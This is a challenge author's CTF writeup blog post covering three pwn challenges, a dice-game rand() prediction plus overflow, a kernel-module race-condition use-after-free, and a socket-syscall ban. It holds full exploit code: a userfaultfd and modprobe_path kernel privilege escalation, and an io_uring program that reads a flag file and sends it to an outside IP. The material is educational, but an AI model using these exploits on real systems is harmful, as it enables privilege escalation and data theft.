---
title: "BauhiniaCTF 2023 Author Writeups"
date: 2023-08-20T17:37:11+08:00
toc: true
description: BauhiniaCTF 2023 Author Writeups of my challenges
tags: ["ctf"]
draft: false
---

<!--more-->
# Introduction
In Bauhinia CTF 2023, I have created 3 pwn challenge: `God of Gamblers`, `Kernpass`, and `Disconnect`.

In this post, I will show you the author writeups and the intended solution of those challenges.

Hope You enjoyed the challenges.
# God of Gamblers (50 points / 45 solves)
![Imgur](https://i.imgur.com/S3VTwBJ.png)

This challenge is aimed for beginner-friendly which doesn't require much exploit skill and technique. The challenging point is to understand that it is easy to predict the random value gerenarted by `srand(time(0))` and  `rand()`, and a little bit buffer overflow.
In this challenge, only the stripped binary provided. Here is the source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

void init() {
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stderr, 0, 2, 0);
	alarm(60);
}

void tournament() {
    FILE *fp;
    unsigned long guess;
    unsigned long random_number;
    
    // Open /dev/urandom for reading
    fp = fopen("/dev/urandom", "r");
    if (fp == NULL) {
        printf("Error opening /dev/urandom.\n");
        exit(1);
    }

    // Read 4 bytes from /dev/urandom into the random_number variable
    fread(&random_number, sizeof(unsigned long), 1, fp);

    // Close /dev/urandom
    fclose(fp);

    // Do something with the random number
    printf("Now you enter the Charity Gamble Tournament\n");
    printf("This is the final round\n");
    printf("Win the flag or Lose the game\n");
    printf("Enter your guess:");
    scanf("%s", &guess);

    if (guess == random_number) {
        printf("You are the god of gamblers!\n");
        printf("Here is your flag!\n");
        win();
    } else {      
	    printf("You lose!");
    }
    return 0;
}

void win(){
    FILE *fp;
    char flag[40];;
    // Open the file for reading
    fp = fopen("flag.txt", "r");
    if (fp == NULL) {
        printf("Error opening file.\n");
        exit(1);
    }

    fread(&flag, 40, 1, fp);
    printf("%s", flag);
}


int main() {
    int dice1, dice2, dice3, points, guess, result, bet;
    int balance = 20; // initialize the player's balance to 20
    int goal = 25000000; // set the goal to 25,000,000

	init();

    srand(time(NULL)); // seed the random number generator with the current time

    printf("Welcome to the dice game!\n");
    printf("You have $%d to start with. The goal is to reach $%d.\n", balance, goal);

    while (balance < goal) { // as long as the player has not reached the goal

        printf("Enter your bet (or enter 0 to quit): ");
        scanf("%d", &bet);

        if (bet <= 0) {
            break; // exit the loop if the player chooses to quit
        }

        if (bet > balance) {
            printf("You don't have enough money to place that bet.\n");
            continue; // go back to the top of the loop to ask for a valid bet
        }

        printf("Enter 1 for small or 2 for big: ");
        scanf("%d", &guess);

        dice1 = rand() % 6 + 1; // generate a random number between 1 and 6 for each die
        dice2 = rand() % 6 + 1;
        dice3 = rand() % 6 + 1;
        points = dice1 + dice2 + dice3; // add up the points from the three dice

        // determine if the result is small or big
        if (points >= 3 && points <= 9) {
            result = 1; // small
        } else {
            result = 2; // big
        }

        // determine the winner
        if (guess == result) {
            balance += bet; // player wins
            printf("Congratulations, you win $%d!\n", bet);
        } else {
            balance -= bet; // player loses
            printf("Sorry, you lose $%d.\n", bet);
        }

        printf("The result is %d (dice 1: %d, dice 2: %d, dice 3: %d).\n", points, dice1, dice2, dice3);
        printf("Your balance is now $%d.\n", balance);
    }

    if (balance >= goal) {
        printf("Congratulations, you have reached the goal of $%d!\n", goal);
        tournament();
    } else {
        printf("Thanks for playing! Your final balance is $%d.\n", balance);
    }

    return 0;
}

```

There are two vulnerability in the program.
## Vulnerability 1
Run the progam, we will seee the goal is to win $25000000 from $20.
```bash
Welcome to the dice game!
You have $20 to start with. The goal is to reach $25000000.
Enter your bet (or enter 0 to quit): 
```
To play the game, we need to enter our bet and choose `small` or `big`
```
Enter your bet (or enter 0 to quit): 20
Enter 1 for small or 2 for big: 2
Sorry, you lose $20.
The result is 6 (dice 1: 1, dice 2: 4, dice 3: 1).
Your balance is now $0.
```
The result is combined by 3 dices. 3-9 is small and 10-18 is big.
From the source code, we can found all the dices are gerneated from `rand()`
```c
dice1 = rand() % 6 + 1; // generate a random number between 1 and 6 for each die
dice2 = rand() % 6 + 1;
dice3 = rand() % 6 + 1;
points = dice1 + dice2 + dice3; // add up the points from the three dice
```
Also, we knew the seed is based on time(0);
```c
srand(time(NULL));
```
In view of that, we can use the same seed to predict the `rand()` result.
```python
# Load the C standard library
libc = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6")

# Define the argument and return types for srand
libc.srand.argtypes = [ctypes.c_uint]

# Define the argument and return types for rand
libc.rand.restype = ctypes.c_int

# Seed the random number generator with the current time
libc.srand(int(time.time()))


def guess(libc):
    # Generate a random number between 1 and 6
    r1 = libc.rand() % 6 + 1
    r2 = libc.rand() % 6 + 1
    r3 = libc.rand() % 6 + 1
    
    print(r1,r2,r3)
    points = r1+r2+r3
    if points >= 10:
        return 2
    return 1

balance = 20
for i in range(21):
    sla("Enter your bet (or enter 0 to quit): ", str(balance))
    sla("Enter 1 for small or 2 for big: ", str(guess(libc)))
    balance *= 2
```

## Vulnerability 2
With the above prediction, We are entered to the final stage.

This time, the challenge seems require us to guess the value from `/dev/urandom`.
```c
  // Open /dev/urandom for reading
    fp = fopen("/dev/urandom", "r");
    if (fp == NULL) {
        printf("Error opening /dev/urandom.\n");
        exit(1);
    }

    // Read 4 bytes from /dev/urandom into the random_number variable
    fread(&random_number, sizeof(unsigned long), 1, fp);

    // Close /dev/urandom
    fclose(fp);
```

It seems a impossible task for me (maybe it just a piece of cake for crypto player)

However, when we look closer, it use `scanf("%s", &guess);` to receive the guess and the random_number and the guess are next to each other. So, it is clear to know that, we can input 16 same bytes to pass it.

## Exploit script
```python
from pwn import *
import ctypes

TARGET = './chall'
#HOST = "127.0.0.1"
#PORT = 9999
HOST = 'chall.pwnable.hk'
PORT = 20001
context.arch = 'amd64' # i386/amd64
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
elf = ELF(TARGET)

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote(HOST, PORT)
    # libc = ELF('')
else:
    p = process(TARGET)
    libc = elf.libc
    

#--- helper functions
s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data) 
sl      = lambda data               :p.sendline(data) 
sla     = lambda delim,data         :p.sendlineafter(delim, data) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
# misc functions
uu32    = lambda data   :u32(data.ljust(4, b'\x00'))
uu64    = lambda data   :u64(data.ljust(8, b'\x00'))
leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
#---


# Load the C standard library
libc = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6")

# Define the argument and return types for srand
libc.srand.argtypes = [ctypes.c_uint]

# Define the argument and return types for rand
libc.rand.restype = ctypes.c_int

# Seed the random number generator with the current time
libc.srand(int(time.time()))


def guess(libc):
    # Generate a random number between 1 and 6
    r1 = libc.rand() % 6 + 1
    r2 = libc.rand() % 6 + 1
    r3 = libc.rand() % 6 + 1
    
    print(r1,r2,r3)
    points = r1+r2+r3
    if points >= 10:
        return 2
    return 1


balance = 20
for i in range(21):
    sla("Enter your bet (or enter 0 to quit): ", str(balance))
    sla("Enter 1 for small or 2 for big: ", str(guess(libc)))
    balance *= 2

sl("A"*16)
p.interactive()

```

# Kernpass (430 points / 10 solves)
![Imgur](https://i.imgur.com/VxCl23a.png)

Kernpass is a kernel pwn challenge. This is the first time I make a kernel pwn challegne, so it actually cost me so much time on compiling kernel, busybox and kernel module debugging. To be honest, this is the very time for me to create a kernel pwnchallenge, amount of terrible permission misconfiguration leads to several unintended solution. I apologize for that.

This challnege is a very classic "note-liked" heap challenge, it should be easy for the kernel pwn player. You may find that the challenge called "kernpass" but there are not any encryption or endcoding elements inside. In fact, in the very early stages of the idea, I did want to implement a complex encryption system on it. However, I found it difficult to solve on my own :( and the hard deadline is coming soon. So I keep it simple.

I think it is a light work for kernel pwn player to reverse it, so I decided to provide the kernel module only.

Here is the source code of the kernel module:
```c
#include <linux/cdev.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/random.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("botton");
MODULE_DESCRIPTION("kernpass");

#define DEVICE_NAME "kernpass"
#define ADD_PW 0x13370001 
#define CHK_PW 0x13370002
#define EDIT_PW 0x13370003
#define DEL_PW 0x13370004

typedef struct {
  unsigned int index;
  unsigned int size;
  char *password;
} request_t;

typedef struct {
  unsigned int size;
  char *password;
} password_entity;

typedef struct {
  password_entity *passwords[0x20];
} password_list;

password_list* main_list;

static int add_password(request_t* req)
{
  unsigned int index;
  unsigned int size;
  char *password;
  password_entity *tmp_entity;

  index = req->index;
  size = req->size;
  password = req->password;

  if (index >= 0 && index < 0x20 && size <= 512) { 

    tmp_entity = (password_entity*)kmalloc(sizeof(password_entity), GFP_KERNEL_ACCOUNT);
    tmp_entity->size = size;
    tmp_entity->password = (char *)kmalloc(size, GFP_KERNEL_ACCOUNT);

    if (unlikely(copy_from_user(tmp_entity->password, password, size))){
      kfree(tmp_entity);
      return -1;
    }

    main_list->passwords[index] = tmp_entity;
  } else {
    return -1;
  }
 
  return 0;
}

static int check_password(request_t* req)
{
  unsigned int index; 
  unsigned int size;
  char *password;
  password_entity *tmp_entity;

  index = req->index;
  password = req->password;

  if (index >= 0 && index < 0x20) { 
    if (main_list->passwords[index]){
      tmp_entity = main_list->passwords[index];
      size = tmp_entity->size;

      if (unlikely(copy_to_user(password, tmp_entity->password, size))){
        return -1;
      }
    } else {
      return -1;
    }
  } else {
    return -1;;
  }

  return 0;
}

static int edit_password(request_t* req)
{
  unsigned int index;
  unsigned int size;
  char *password;
  password_entity *tmp_entity;

  index = req->index;
  password = req->password;

  if (index >= 0 && index < 0x20) { 
    if (main_list->passwords[index]){

      tmp_entity = main_list->passwords[index];
      
      size = tmp_entity->size;
  
      if (unlikely(copy_from_user(tmp_entity->password, password, size))){
        return -1;
      }

    } else {
      return -1;
    }

  } else {
    return -1;
  }

  return 0;
}

static int delete_password(request_t* req)
{
  unsigned int index;

  index = req->index;
  if (index >= 0 && index < 0x20) { 
    kfree(main_list->passwords[index]->password);
    kfree(main_list->passwords[index]);
    main_list->passwords[index] = 0;
  } else{
    return -1;
  }
  return 0;
}

static int module_open(struct inode *inode, struct file *filp) {
  main_list = (password_list*)kmalloc(sizeof(password_list), GFP_KERNEL_ACCOUNT);
  return 0;
}

static int module_close(struct inode *inode, struct file *filp) {
  return 0;
}

static long module_ioctl(struct file *filp,
                         unsigned int cmd,
                         unsigned long arg) {
  request_t req;
  if (unlikely(copy_from_user(&req, (void*)arg, sizeof(req))))
    return -1;

  switch (cmd) {
    case ADD_PW: return add_password(&req);
    case CHK_PW: return check_password(&req);
    case EDIT_PW: return edit_password(&req);
    case DEL_PW: return delete_password(&req);
    default: return -1;
  }
}

static struct file_operations module_fops = {
  .owner   = THIS_MODULE,
  .open    = module_open,
  .release = module_close,
  .unlocked_ioctl = module_ioctl
};

static dev_t dev_id;
static struct cdev c_dev;

static int __init module_initialize(void)
{
  if (alloc_chrdev_region(&dev_id, 0, 1, DEVICE_NAME))
    return -EBUSY;

  cdev_init(&c_dev, &module_fops);
  c_dev.owner = THIS_MODULE;

  if (cdev_add(&c_dev, dev_id, 1)) {
    unregister_chrdev_region(dev_id, 1);
    return -EBUSY;
  }

  main_list = (password_list*)kmalloc(sizeof(password_list), GFP_KERNEL_ACCOUNT);
  return 0;
}

static void __exit module_cleanup(void)
{
  cdev_del(&c_dev);
  unregister_chrdev_region(dev_id, 1);
}

module_init(module_initialize);
module_exit(module_cleanup);

```

## Vulnerability
The intended vulnerability of the challenge is race condition to cause UAF.
We can see it has not implemented mutex in the source code and it enabled userfaultfd for normal user from `/init`.
```bash
echo 1 > /proc/sys/vm/unprivileged_userfaultfd
```

## UAF - Leak kernel address
We can follow the following steps to leak kernel address

Thread 1:
1. Create a 0x20 size password, password #0
2. register a uffd page
3. Check password #0 using the uffd page to trigger page fault

Thread 2 start:

4. Delete password #0 
5. Spray `seq_operations` [kmalloc-32 heap spray](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628#seq_operations)

Thread 2 end, thread 1 continue

It return the data of `seq_operations` struture which reveal the kernel address. We can calculate the kernel base address by finding the offset manuelly.

## UAF - Arbitrary Address Write Primitive (AAW)
As the structure size of password_entity 0x10, we are able to retrieve AAW through heap chunk overlapping.

Thread 1:
1. Create a 0x10 size password, password #0
2. register a uffd page
3. Edit password #0 using the uffd page to trigger page fault and prepare the address to write data in

Thread 2 start:

4. Delete password #0
5. Create two 0x20 size password, password #2 & #3

Thread 2 end, thread 1 continue

6. The pointer in password #3 will be overwritten with the address that we prepared in step3

The easiest way to become root with knowing kernel base address and having AAW is to modify modprobe_path.

Therefore, we put our path to modprobe_path address by AAW to exploit it and get the flag.

## Exploit Script
```c
#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/ipc.h>

#define ADD_PW 0x13370001 
#define CHK_PW 0x13370002
#define EDIT_PW 0x13370003
#define DEL_PW 0x13370004

cpu_set_t pwn_cpu;
int fd;
unsigned long kheap;
unsigned long kbase;

void *page;
char *buf;
int uffd_stage = 0;
int spray[0x50];

typedef struct {
  unsigned int index;
  unsigned int size;
  char *password;
} request_t;

typedef struct {
  unsigned int size;
  char *password;
} password_entity;

typedef struct {
  password_entity *passwords[0x20];
} password_list;


int add_password(unsigned int index, unsigned int size, char *pw){
    //printf("ADD\n");
    request_t req;
    memset(&req, '\0', sizeof(request_t));
    req.index = index;
    req.size = size;
    req.password = pw;
    int ret = ioctl(fd, ADD_PW, &req);
    if (ret < 0) die("Add");
    //printf("Created #%d\n", ret);
    return ret;
}

int check_password(unsigned int index, char *pw){
    //printf("ADD\n");
    request_t req;
    memset(&req, '\0', sizeof(request_t));
    req.index = index;
    req.size = 0;
    req.password = pw;
    int ret = ioctl(fd, CHK_PW, &req);
    if (ret < 0) die("check password");
    //printf("Created #%d\n", ret);
    return ret;
}

int edit_password(unsigned int index, char *pw){
    //printf("ADD\n");
    request_t req;
    memset(&req, '\0', sizeof(request_t));
    req.index = index;
    req.size = 0;
    req.password = pw;
    int ret = ioctl(fd, EDIT_PW, &req);
    if (ret < 0) die("EDIT");
    //printf("Created #%d\n", ret);
    return ret;
}

int delete_password(unsigned int index){
    //printf("ADD\n");
    request_t req;
    memset(&req, '\0', sizeof(request_t));
    req.index = index;
    req.size = 0;
    req.password = 0;
    int ret = ioctl(fd, DEL_PW, &req);
    if (ret < 0) die("RESET");
    //printf("Created #%d\n", ret);
    return ret;
}

int die(char *text){                
    printf("Die: %s\n", text);
    exit(-1);
} 

int hexdump(char *target, int size){                
    for (int i=0; i<size/8; i++){                 
      if (*(unsigned long*)(target+(i*8)) != 0){
        printf("0x%x: 0x%lx\n", i*8, *(unsigned long*)(target+(i*8)));    
      }                              
    }                                                                                                
}

int uffd_stage1(){
  puts("[+] UAF read");
  delete_password(0);   

  for (int i=0; i < 0x50; i++){
    seq_open();
  }

}

int uffd_stage2(){

  puts("[+] UAF write");

  delete_password(0);   

  add_password(2, 0x20, buf);  
  add_password(3, 0x20, buf);  
}

static void* fault_handler_thread(void *arg) {
  char *dummy_page;
  static struct uffd_msg msg;
  struct uffdio_copy copy;
  struct pollfd pollfd;
  long uffd;
  static int fault_cnt = 0;

  uffd = (long)arg;

  dummy_page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (dummy_page == MAP_FAILED) die("mmap(dummy)");

  puts("[+] fault_handler_thread: waiting for page fault...");
  pollfd.fd = uffd;
  pollfd.events = POLLIN;

  while (poll(&pollfd, 1, -1) > 0) {
    if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
      die("poll");

    /* Trigger page fault */
    if (read(uffd, &msg, sizeof(msg)) <= 0) die("read(uffd)");
    assert (msg.event == UFFD_EVENT_PAGEFAULT);

    printf("[+] uffd: flag=0x%llx\n", msg.arg.pagefault.flags);
    printf("[+] uffd: addr=0x%llx\n", msg.arg.pagefault.address);
    if (uffd_stage == 0){
      uffd_stage1();
    } else if (uffd_stage == 1){
      uffd_stage2();
    }
    uffd_stage++;
    //----------------------------------------------

    copy.src = (unsigned long)buf;
    copy.dst = (unsigned long)msg.arg.pagefault.address;
    copy.len = 0x1000;
    copy.mode = 0;
    copy.copy = 0;
    if (ioctl(uffd, UFFDIO_COPY, &copy) == -1) die("ioctl(UFFDIO_COPY)");
  }

  return NULL;
}

int register_uffd(void *addr, size_t len) {
  /* uffd template from https://pawnyable.cafe/ */
  struct uffdio_api uffdio_api;
  struct uffdio_register uffdio_register;
  long uffd;
  pthread_t th;

  /* Register userfaultfd */
  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  if (uffd == -1) die("userfaultfd");

  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
    die("ioctl(UFFDIO_API)");

  /* Register uffd page */
  uffdio_register.range.start = (unsigned long)addr;
  uffdio_register.range.len = len;
  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
    die("UFFDIO_REGISTER");

  /* Create thread when page fault */
  if (pthread_create(&th, NULL, fault_handler_thread, (void*)uffd))
    die("pthread_create");

  return 0;
}


int seq_open()
{
	int seq;
	if ((seq=open("/proc/self/stat", O_RDONLY))==-1)
	{
		puts("[X] Seq Open Error");
		exit(0);
	}
	return seq;
}

int main(){

    system("echo -ne '#!/bin/sh\n/bin/cp /root/flag.txt /tmp/flag.txt\n/bin/chmod 777 /tmp/flag.txt' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/crash");
    system("chmod +x /tmp/crash");

    char *master_pw;
    buf = malloc(0x3000);

    CPU_ZERO(&pwn_cpu);
    CPU_SET(0, &pwn_cpu);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
      die("sched_setaffinity");
  
    // open device
    fd = open("/dev/kernpass", O_RDWR);
    if (fd == -1) die("Open device failed");
   
    // Prepare uffd
    page = mmap(NULL, 0x3000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); 
    register_uffd(page, 0x3000);

    // Leak kbase
    memset(buf, 'A', 0x20);
    add_password(0, 0x20, buf);  

    check_password(0, page);
    hexdump(page, 0x100);
    kbase = *(unsigned long*)(page+0x8) - 0x4148d0;
    printf("[+] kbase: 0x%llx\n", kbase);

    // Overlap chunk
    memset(buf, 'A', 0x10);
    add_password(0, 0x10, buf);
    // setup fake entity  
    *(unsigned long*)(buf) = 0x8;
    *(unsigned long*)(buf+0x8) = kbase + 0x1a8be80;
    // trigger UAF
    edit_password(0, page+0x2000);

    edit_password(3, "/tmp/x");
    
    system("/tmp/crash");
    system("cat /tmp/flag.txt");

    
    return 0;
}
```

# Disconnect (500 points / 1 solve)
![Imgur](https://i.imgur.com/5VpjYNo.jpg)

The idea of this challenge is very simple, just banned `socket` syscall. Players are required to get the flag without using `socket` syscall.

I want to keep the challenge as lightweight as possible, I didn't implement so much on the hardening and it surely possible to come up with several unintended solutions.

In my team internal difficulty rating, we expected this would be a easy challenge for many expereinced pwners (especially kernel pwner) because of the hot topic of `io_uring` in KCTF in recent years.

We are surprised that only one team solved it (an unintended solution from Shellphish's fork bomb with no mercy).


## Intended Solution
https://manpages.debian.org/unstable/liburing-dev/io_uring_enter.2.en.html

READ this and you will find the anwser.
`io_uring_enter` can used for performing I/O operation. One of the opcode is `IORING_OP_SOCKET`, it do the same as `socket` syscall"

https://manpages.debian.org/unstable/liburing-dev/io_uring_enter.2.en.html#IORING_OP_SOCKET
>Issue the equivalent of a socket(2) system call. fd must contain the communication domain, off must contain the communication type, len must contain the protocol, and rw_flags is currently unused and must be set to zero. See also socket(2) for the general description of the related system call. Available since 5.19.

Through strace the solve script, there is not a single word 'socket' in the result.
```bash
io_uring_setup(1, {flags=0, sq_thread_cpu=0, sq_thread_idle=0, sq_entries=1, cq_entries=2, features=IORING_FEAT_SINGLE_MMAP|IORING_FEAT_NODROP|IORING_FEAT_SUBMIT_STABLE|IORING_FEAT_RW_CUR_POS|IORING_FEAT_CUR_PE4
mmap(NULL, 388, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, 4, 0) = 0x7f4004925000
mmap(NULL, 64, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, 4, 0x10000000) = 0x7f4004924000
io_uring_enter(4, 1, 0, 0, NULL, 8)     = 1
```

The above snip is part of the strace result of a socket fd creation.

Once we have a socket fd, the rest of stuffs are a piece of cake.

`open flag -> read flag -> create io_uring socket -> connect to your public server or webhook -> send flag -> solved`

## Exploit Script
You can retrieve the flag via listening on your public accessible machine or webhook services (e.g. requestbin)

> solve.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <liburing.h>

char *ip = "YOUR PUBLIC IP"; //change this
int port = 58888; //change this

int main(int argc , char *argv[])
{
    struct io_uring ring;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    char message[0x100];
    char flag[0x100];

    memset(message, 0, 0x100);
    memset(flag, 0, 0x100);

    int fd = open("/flag.txt", 0);                      

    read(fd , flag, 0x100);
    write(1, flag, 0x100);

    io_uring_queue_init(1, &ring, 0);
    sqe = io_uring_get_sqe(&ring);
    
    sqe->opcode = IORING_OP_SOCKET;
    sqe->fd = AF_INET;
    sqe->off = SOCK_STREAM;
    sqe->len = 0;			
    sqe->rw_flags = 0;
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);

    int sockfd = cqe->res;

    strcat(message, "GET /");
    strcat(message, flag);
    strcat(message, " HTTP/1.1\r\n");
    strcat(message, "Connection: close\r\n\r\n");

    // socket connection

    struct sockaddr_in info;
    bzero(&info,sizeof(info));
    info.sin_family = PF_INET;

    // ip & port
    info.sin_addr.s_addr = inet_addr(ip);
    info.sin_port = htons(port);

    int err = connect(sockfd, (struct sockaddr *)&info, sizeof(info));
    send(sockfd, message, 0x100,0);

    return 0;
}

```
> upload.py
```python
from pwn import *

r = remote("chall-us.pwnable.hk", 20003)
with open("solve", 'rb') as file:
    data = file.read()

file_size = len(data)
print(f"file size: {file_size}")
r.sendline(str(file_size))
sleep(1)
print("Upload data")
r.send(data)
sleep(10)
```